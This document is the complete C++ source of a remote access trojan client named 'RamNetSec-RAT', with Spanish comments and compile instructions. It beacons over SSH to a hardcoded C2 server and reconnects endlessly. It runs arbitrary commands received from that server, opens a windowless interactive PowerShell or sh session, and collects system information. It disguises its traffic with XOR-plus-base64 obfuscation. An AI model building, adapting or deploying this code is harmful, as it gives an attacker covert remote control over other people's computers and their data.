// RamNetSec-RAT - Cliente C++ para Windows usando libssh
// Requiere: libssh instalado y en el PATH

#include <libssh/libssh.h>
#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#ifdef _WIN32
#include <windows.h>
#endif

#include <sstream>
#include <algorithm>
#include <cctype>
#include <stdexcept>
#include <vector>

// --- XOR y base64 ---
const std::string XOR_KEY = "clave_xor"; // Cambia esto para que coincida con el servidor

std::string xor_obfuscate(const std::string& data, const std::string& key) {
    std::string out;
    out.reserve(data.size());
    for (size_t i = 0; i < data.size(); ++i) {
        out.push_back(data[i] ^ key[i % key.size()]);
    }
    return out;
}

// Base64 (versión simple, solo para este uso)
static const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

std::string base64_encode(const std::string& in) {
    std::string out;
    int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

std::string base64_decode(const std::string& in) {
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;
    std::string out;
    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

#ifdef _WIN32
// Forward declaration for exec_cmd
std::string exec_cmd(const std::string& cmd);

 // Obtiene información técnica del sistema en Windows
std::string get_system_info() {
    std::string info;
    info += "=== SYSTEMINFO ===\n";
    info += exec_cmd("systeminfo");
    info += "\n=== CPU ===\n";
    info += exec_cmd("Get-CimInstance Win32_Processor | Select-Object Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed | Format-List");
    info += "\n=== MEMORY ===\n";
    info += exec_cmd("Get-CimInstance Win32_PhysicalMemory | Select-Object Capacity,Manufacturer,PartNumber,Speed | Format-List");
    info += "\n=== OS ===\n";
    info += exec_cmd("Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,OSArchitecture,TotalVisibleMemorySize,FreePhysicalMemory | Format-List");
    return info;
}

// Ejecuta un comando usando PowerShell y devuelve la salida como string
std::string exec_cmd(const std::string& cmd) {
    // Ejecuta el comando usando PowerShell, forzando salida UTF-8 y mostrando errores
    std::string powershell_cmd =
        "powershell.exe -NoProfile -Command \"chcp 65001 >$null; try { " +
        cmd +
        " | Out-String -Stream } catch { $_ | Out-String -Stream }\"";
    FILE* pipe = _popen(powershell_cmd.c_str(), "r");
    if (!pipe) return "Error ejecutando comando en PowerShell";
    std::string result;
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        result += buffer;
    }
    int rc = _pclose(pipe);
    if (rc != 0) {
        result += "\n[PowerShell terminó con código " + std::to_string(rc) + "]";
    }
    // Limpia la salida de saltos de línea extra
    while (!result.empty() && (result.back() == '\n' || result.back() == '\r')) result.pop_back();
    return result;
}
#else
// Forward declaration for exec_cmd
std::string exec_cmd(const std::string& cmd);

// Obtiene información técnica del sistema en Linux/macOS
std::string get_system_info() {
    std::string info;
    info += "=== UNAME ===\n";
    info += exec_cmd("uname -a");
    info += "\n=== CPU INFO ===\n";
    info += exec_cmd("cat /proc/cpuinfo 2>/dev/null | grep 'model name' | head -1");
    info += "\n=== MEM INFO ===\n";
    info += exec_cmd("cat /proc/meminfo 2>/dev/null | grep MemTotal");
    info += "\n=== LSB RELEASE ===\n";
    info += exec_cmd("lsb_release -a 2>/dev/null");
    return info;
}

// Ejecuta un comando en sistemas no Windows (bash/sh)
std::string exec_cmd(const std::string& cmd) {
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return "Error ejecutando comando";
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        result += buffer;
    }
    int rc = pclose(pipe);
    if (rc != 0) {
        result += "\n[Shell terminó con código " + std::to_string(rc) + "]";
    }
    while (!result.empty() && (result.back() == '\n' || result.back() == '\r')) result.pop_back();
    return result;
}
#endif

int main() {
    // Configuración automática
    // IMPORTANTE: Cambia 'server_ip' a la IP real del servidor.
    // Usa "127.0.0.1" si el servidor está en la misma máquina,
    // o la IP LAN/WAN del servidor si es remoto.
    const std::string server_ip = "192.168.0.14";
    const int port = 2222; // Asegúrate de que port sea de tipo int
    const std::string user = "usuario";      // Cambia esto si tu servidor requiere otro usuario
    const std::string password = "password"; // Cambia esto si tu servidor requiere otro password

    while (true) {
        ssh_session session = ssh_new();
        if (session == nullptr) {
            std::cerr << "No se pudo crear la sesión SSH\n";
#ifdef _WIN32
            Sleep(5000);
#else
            usleep(5000000);
#endif
            continue;
        }
        ssh_options_set(session, SSH_OPTIONS_HOST, server_ip.c_str());
        ssh_options_set(session, SSH_OPTIONS_PORT, (const void *)&port); // Cast to avoid expected identifier error
        ssh_options_set(session, SSH_OPTIONS_USER, user.c_str());

        if (ssh_connect(session) != SSH_OK) {
            std::cerr << "Error conectando: " << ssh_get_error(session) << "\n";
            ssh_free(session);
#ifdef _WIN32
            Sleep(5000);
#else
            usleep(5000000);
#endif
            continue;
        }

        if (ssh_userauth_password(session, nullptr, password.c_str()) != SSH_AUTH_SUCCESS) {
            std::cerr << "Autenticación fallida: " << ssh_get_error(session) << "\n";
            ssh_disconnect(session);
            ssh_free(session);
#ifdef _WIN32
            Sleep(5000);
#else
            usleep(5000000);
#endif
            continue;
        }

        ssh_channel channel = ssh_channel_new(session);
        if (channel == nullptr) {
            std::cerr << "No se pudo crear el canal\n";
            ssh_disconnect(session);
            ssh_free(session);
#ifdef _WIN32
            Sleep(5000);
#else
            usleep(5000000);
#endif
            continue;
        }
        if (ssh_channel_open_session(channel) != SSH_OK) {
            std::cerr << "No se pudo abrir el canal de sesión\n";
            ssh_channel_free(channel);
            ssh_disconnect(session);
            ssh_free(session);
#ifdef _WIN32
            Sleep(5000);
#else
            usleep(5000000);
#endif
            continue;
        }
        if (ssh_channel_request_shell(channel) != SSH_OK) {
            std::cerr << "No se pudo solicitar shell\n";
            ssh_channel_close(channel);
            ssh_channel_free(channel);
            ssh_disconnect(session);
            ssh_free(session);
#ifdef _WIN32
            Sleep(5000);
#else
            usleep(5000000);
#endif
            continue;
        }

        std::cout << "Conectado al servidor C2. Esperando comandos...\n";
        char buffer[4096];
        std::string cmd_buffer;
        while (ssh_channel_is_open(channel) && !ssh_channel_is_eof(channel)) {
            int nbytes = ssh_channel_read(channel, buffer, sizeof(buffer) - 1, 0);
            if (nbytes > 0) {
                buffer[nbytes] = '\0';
                cmd_buffer += buffer;
                // Procesar comandos por línea
                size_t pos;
                while ((pos = cmd_buffer.find('\n')) != std::string::npos) {
                    std::string cmd = cmd_buffer.substr(0, pos);
                    cmd_buffer.erase(0, pos + 1);
                    if (cmd.empty()) continue;

                    // --- Ofuscación XOR ---
                    bool xor_mode = false;
                    std::string real_cmd = cmd;
                    if (cmd.rfind("__XOR__", 0) == 0) {
                        // Comando ofuscado
                        try {
                            std::string b64 = cmd.substr(7);
                            std::string obf = base64_decode(b64);
                            real_cmd = xor_obfuscate(obf, XOR_KEY);
                            xor_mode = true;
                        } catch (...) {
                            real_cmd = "[ERROR DEOFUSCANDO COMANDO]";
                        }
                    }

                    std::string output;

                    // Modo interactivo PowerShell
                    if (real_cmd == "1") {
#ifdef _WIN32
                        // --- Sesión interactiva PowerShell real ---
                        // Crear pipes para stdin y stdout
                        HANDLE hChildStdinRd, hChildStdinWr, hChildStdoutRd, hChildStdoutWr;
                        SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
                        CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0);
                        SetHandleInformation(hChildStdoutRd, HANDLE_FLAG_INHERIT, 0);
                        CreatePipe(&hChildStdinRd, &hChildStdinWr, &saAttr, 0);
                        SetHandleInformation(hChildStdinWr, HANDLE_FLAG_INHERIT, 0);

                        PROCESS_INFORMATION piProcInfo;
                        STARTUPINFOW siStartInfo;
                        ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
                        ZeroMemory(&siStartInfo, sizeof(STARTUPINFOW));
                        siStartInfo.cb = sizeof(STARTUPINFOW);
                        siStartInfo.hStdError = hChildStdoutWr;
                        siStartInfo.hStdOutput = hChildStdoutWr;
                        siStartInfo.hStdInput = hChildStdinRd;
                        siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

                        // Comando PowerShell interactivo en UTF-8
                        wchar_t cmdLine[] = L"powershell.exe -NoProfile -Command -";
                        BOOL bSuccess = CreateProcessW(
                            NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &siStartInfo, &piProcInfo);

                        CloseHandle(hChildStdoutWr);
                        CloseHandle(hChildStdinRd);

                        if (!bSuccess) {
                            std::string err = "No se pudo iniciar PowerShell interactivo.\n__END__\n";
                            ssh_channel_write(channel, err.c_str(), static_cast<uint32_t>(err.size()));
                        } else {
                            std::string intro = "Entrando en modo consola interactiva PowerShell. Escribe 'exit' para salir.\n";
                            ssh_channel_write(channel, intro.c_str(), static_cast<uint32_t>(intro.size()));
                            char ps_buffer[4096];
                            DWORD bytesRead = 0;
                            std::string input_buffer;
                            bool running = true;
                            while (running && ssh_channel_is_open(channel) && !ssh_channel_is_eof(channel)) {
                                // Leer salida de PowerShell y enviarla al canal
                                while (PeekNamedPipe(hChildStdoutRd, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0) {
                                    DWORD toRead = std::min(bytesRead, (DWORD)(sizeof(ps_buffer) - 1));
                                    if (ReadFile(hChildStdoutRd, ps_buffer, toRead, &bytesRead, NULL) && bytesRead > 0) {
                                        ps_buffer[bytesRead] = '\0';
                                        std::string out(ps_buffer, ps_buffer + bytesRead);
                                        ssh_channel_write(channel, out.c_str(), static_cast<uint32_t>(out.size()));
                                    }
                                }
                                // Leer comando del canal
                                char shell_buf[4096];
                                int shell_nbytes = ssh_channel_read(channel, shell_buf, sizeof(shell_buf) - 1, 0);
                                if (shell_nbytes > 0) {
                                    shell_buf[shell_nbytes] = '\0';
                                    input_buffer += shell_buf;
                                    size_t shell_pos;
                                    while ((shell_pos = input_buffer.find('\n')) != std::string::npos) {
                                        std::string shell_cmd = input_buffer.substr(0, shell_pos);
                                        input_buffer.erase(0, shell_pos + 1);
                                        if (shell_cmd == "exit") {
                                            std::string bye = "Saliendo de la consola interactiva.\n__END__\n";
                                            ssh_channel_write(channel, bye.c_str(), static_cast<uint32_t>(bye.size()));
                                            running = false;
                                            break;
                                        }
                                        // Escribir comando a PowerShell
                                        DWORD bytesWritten = 0;
                                        std::string cmdline = shell_cmd + "\n";
                                        WriteFile(hChildStdinWr, cmdline.c_str(), (DWORD)cmdline.size(), &bytesWritten, NULL);
                                    }
                                } else if (shell_nbytes < 0) {
                                    break;
                                }
                                Sleep(100);
                            }
                            // Cerrar handles y proceso
                            CloseHandle(hChildStdinWr);
                            CloseHandle(hChildStdoutRd);
                            TerminateProcess(piProcInfo.hProcess, 0);
                            CloseHandle(piProcInfo.hProcess);
                            CloseHandle(piProcInfo.hThread);
                        }
                        continue;
#else
                        // En sistemas no Windows, mantener el comportamiento anterior
                        std::string intro = "Entrando en modo consola interactiva shell. Escribe 'exit' para salir.\n";
                        ssh_channel_write(channel, intro.c_str(), static_cast<uint32_t>(intro.size()));
                        FILE* pipe = popen("/bin/sh", "r+");
                        if (!pipe) {
                            std::string err = "No se pudo iniciar shell.\n__END__\n";
                            ssh_channel_write(channel, err.c_str(), static_cast<uint32_t>(err.size()));
                        } else {
                            char shell_buf[4096];
                            std::string shell_input;
                            bool exit_interactive = false;
                            while (ssh_channel_is_open(channel) && !ssh_channel_is_eof(channel) && !exit_interactive) {
                                int shell_nbytes = ssh_channel_read(channel, shell_buf, sizeof(shell_buf) - 1, 0);
                                if (shell_nbytes > 0) {
                                    shell_buf[shell_nbytes] = '\0';
                                    shell_input += shell_buf;
                                    size_t shell_pos;
                                    while ((shell_pos = shell_input.find('\n')) != std::string::npos) {
                                        std::string shell_cmd = shell_input.substr(0, shell_pos);
                                        shell_input.erase(0, shell_pos + 1);
                                        if (shell_cmd == "exit") {
                                            std::string bye = "Saliendo de la consola interactiva.\n__END__\n";
                                            ssh_channel_write(channel, bye.c_str(), static_cast<uint32_t>(bye.size()));
                                            exit_interactive = true;
                                            break;
                                        }
                                        fputs((shell_cmd + "\n").c_str(), pipe);
                                        fflush(pipe);
                                        char sh_out[4096];
                                        std::string sh_result;
                                        while (fgets(sh_out, sizeof(sh_out), pipe)) {
                                            sh_result += sh_out;
                                            if (strstr(sh_out, "$ ") == sh_out) break;
                                        }
                                        sh_result += "\n__END__\n";
                                        ssh_channel_write(channel, sh_result.c_str(), static_cast<uint32_t>(sh_result.size()));
                                    }
                                } else if (shell_nbytes < 0) {
                                    break;
                                }
                                usleep(100000);
                            }
                            pclose(pipe);
                            continue;
                        }
#endif
                    }
                    // Modo info técnica
                    else if (real_cmd == "2") {
                        output = get_system_info();
                    }
                    // Modo comando normal
                    else {
                        output = exec_cmd(real_cmd);
                    }

                    // Ofuscar respuesta si el comando era ofuscado
                    if (xor_mode) {
                        std::string obf_out = xor_obfuscate(output, XOR_KEY);
                        std::string b64_out = base64_encode(obf_out);
                        output = "__XOR__" + b64_out;
                    }

                    output += "\n__END__\n";
                    ssh_channel_write(channel, output.c_str(), static_cast<uint32_t>(output.size())); // Conversión explícita
                }
            }
            else if (nbytes < 0) {
                break;
            }
            // Pequeña espera para evitar alto uso de CPU
#ifdef _WIN32
            Sleep(100);
#else
            usleep(100000);
#endif
        }

        ssh_channel_send_eof(channel);
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        ssh_disconnect(session);
        ssh_free(session);
        std::cout << "Desconectado del servidor. Reintentando en 5 segundos...\n";
#ifdef _WIN32
        Sleep(5000);
#else
        usleep(5000000);
#endif
    }
    return 0;
}
// Compilación: g++ cliente_windows.cpp -o cliente_windows -lssh -lpthread -ldl
// Ejecución: ./cliente_windows
